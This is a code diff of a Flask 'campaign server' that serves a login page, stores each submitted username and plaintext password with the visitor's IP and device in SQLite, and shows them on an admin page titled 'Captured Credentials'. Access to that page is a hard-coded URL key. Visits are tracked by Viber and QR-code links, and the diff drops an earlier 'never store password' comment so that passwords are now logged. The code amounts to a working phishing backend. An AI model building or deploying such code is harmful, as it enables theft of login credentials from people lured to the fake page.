@@ -1,13 +1,30 @@
-from flask import Flask, request, jsonify, send_from_directory
-from supabase import create_client
+from flask import Flask, request, jsonify, render_template, send_from_directory
+import sqlite3
 import os
 from datetime import datetime
 
 app = Flask(__name__)
 
-SUPABASE_URL = os.environ.get('SUPABASE_URL')
-SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
-supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+DB_PATH = 'campaign.db'
+
+# ─── Database Setup ────────────────────────────────────────────────────────────
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS logs (
+            id        INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            event     TEXT,
+            source    TEXT,
+            device    TEXT,
+            username  TEXT,
+            password  TEXT,
+            ip        TEXT
+        )
+    ''')
+    conn.commit()
+    conn.close()
 
 # ─── Serve the Login Page ──────────────────────────────────────────────────────
 @app.route('/')
@@ -17,71 +34,76 @@ def index():
 # ─── Log API (called by the login page JS) ─────────────────────────────────────
 @app.route('/api/log', methods=['POST'])
 def log_event():
-    try:
-        data = request.get_json() or {}
-        
-        log_data = {
-            'timestamp': data.get('time', datetime.now().isoformat()),
-            'source': data.get('source', 'direct'),
-            # 'ip': request.remote_addr,           # commented - column missing
-            # 'event': data.get('event', ''),
-            # 'device': data.get('device', ''),
-            # 'username': data.get('username', ''),
-            # 'password': data.get('password', '')  # never store password
-        }
-        
-        supabase.table('logs').insert(log_data).execute()
-        return jsonify({'status': 'logged'}), 200
-        
-    except Exception as e:
-        print("Logging error:", str(e))
-        return jsonify({'status': 'error'}), 200   # don't break the frontend
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'No data'}), 400
+
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute('''
+        INSERT INTO logs (timestamp, event, source, device, username, password, ip)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+    ''', (
+        data.get('time', datetime.now().isoformat()),
+        data.get('event', ''),
+        data.get('source', 'direct'),
+        data.get('device', 'unknown'),
+        data.get('username', ''),
+        data.get('password', ''),
+        request.remote_addr
+    ))
+    conn.commit()
+    conn.close()
+
+    return jsonify({'status': 'ok'})
 
 # ─── Admin Dashboard ───────────────────────────────────────────────────────────
 @app.route('/admin')
 def admin():
+    # Simple password protection via URL param: /admin?key=texas2024
     key = request.args.get('key', '')
     if key != 'texas2024':
         return '<h2 style="font-family:Arial;text-align:center;margin-top:100px">Access Denied</h2>', 403
 
-    # Get all logs safely
-    all_logs = supabase.table('logs').select('*').execute().data or []
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
 
-    # Calculate stats safely (using .get() to avoid crashes)
-    total_visits = sum(1 for r in all_logs if r.get('event') == 'visit')
-    total_submits = sum(1 for r in all_logs if r.get('event') == 'submit')
-    viber_clicks = sum(1 for r in all_logs if r.get('event') == 'visit' and r.get('source') == 'viber')
-    qr_clicks = sum(1 for r in all_logs if r.get('event') == 'visit' and r.get('source') == 'qr')
-    
-    # Comment these for now because 'device' column doesn't exist
-    mobile_submits = 0
-    desktop_submits = 0
-    # mobile_submits = sum(1 for r in all_logs if r.get('event') == 'submit' and r.get('device') == 'mobile')
-    # desktop_submits = sum(1 for r in all_logs if r.get('event') == 'submit' and r.get('device') == 'desktop')
+    # Summary stats
+    c.execute("SELECT COUNT(*) FROM logs WHERE event='visit'")
+    total_visits = c.fetchone()[0]
 
-    # Get submissions and visits
-    submissions = [
-        (r.get('timestamp'), r.get('username'), r.get('password'), 
-         r.get('source'), r.get('device'), r.get('ip'))
-        for r in all_logs if r.get('event') == 'submit'
-    ]
-    submissions.sort(key=lambda x: x[0] or '', reverse=True)
+    c.execute("SELECT COUNT(*) FROM logs WHERE event='submit'")
+    total_submits = c.fetchone()[0]
 
-    visits = [
-        (r.get('timestamp'), r.get('source'), r.get('device'), r.get('ip'))
-        for r in all_logs if r.get('event') == 'visit'
-    ]
-    visits.sort(key=lambda x: x[0] or '', reverse=True)
+    c.execute("SELECT COUNT(*) FROM logs WHERE event='visit' AND source='viber'")
+    viber_clicks = c.fetchone()[0]
 
-    # TODO: Render your HTML template here with the variables
-    # For now, just return a simple message so the page loads
-    return f"""
-    <h2>Admin Panel</h2>
-    <p>Total Visits: {total_visits}</p>
-    <p>Total Submissions: {total_submits}</p>
-    <p>Viber Clicks: {viber_clicks}</p>
-    <p>QR Clicks: {qr_clicks}</p>
-    """, 200
+    c.execute("SELECT COUNT(*) FROM logs WHERE event='visit' AND source='qr'")
+    qr_clicks = c.fetchone()[0]
+
+    c.execute("SELECT COUNT(*) FROM logs WHERE event='submit' AND device='mobile'")
+    mobile_submits = c.fetchone()[0]
+
+    c.execute("SELECT COUNT(*) FROM logs WHERE event='submit' AND device='desktop'")
+    desktop_submits = c.fetchone()[0]
+
+    # All submissions
+    c.execute("""
+        SELECT timestamp, username, password, source, device, ip
+        FROM logs WHERE event='submit'
+        ORDER BY timestamp DESC
+    """)
+    submissions = c.fetchall()
+
+    # All visits
+    c.execute("""
+        SELECT timestamp, source, device, ip
+        FROM logs WHERE event='visit'
+        ORDER BY timestamp DESC
+    """)
+    visits = c.fetchall()
+
+    conn.close()
 
     html = f'''<!DOCTYPE html>
 <html lang="en">
@@ -130,6 +152,7 @@ def admin():
 
 <div class="content">
 
+  <!-- Stats -->
   <div class="stats">
     <div class="stat-card">
       <div class="number">{total_visits}</div>
@@ -157,6 +180,7 @@ def admin():
     </div>
   </div>
 
+  <!-- Submissions Table -->
   <div class="section">
     <h2>🔐 Captured Credentials <a class="refresh" href="?key=texas2024">↻ Refresh</a></h2>
     {"<table><thead><tr><th>Time</th><th>Username</th><th>Password</th><th>Source</th><th>Device</th><th>IP Address</th></tr></thead><tbody>" +
@@ -164,6 +188,7 @@ def admin():
      "</tbody></table>" if submissions else "<div class='empty'>No submissions yet</div>"}
   </div>
 
+  <!-- Visits Table -->
   <div class="section">
     <h2>👁️ Page Visits (Clicks)</h2>
     {"<table><thead><tr><th>Time</th><th>Source</th><th>Device</th><th>IP Address</th></tr></thead><tbody>" +
@@ -178,9 +203,11 @@ def admin():
     return html
 
 if __name__ == '__main__':
+    init_db()
     print("\n✅ Campaign server running!")
     print("📋 Login page:  http://localhost:5000/")
     print("📊 Admin panel: http://localhost:5000/admin?key=texas2024")
     print("🔗 Viber link:  http://YOUR-DOMAIN/?src=viber")
     print("📱 QR code URL: http://YOUR-DOMAIN/?src=qr\n")
     app.run(host='0.0.0.0', port=5000, debug=False)
+
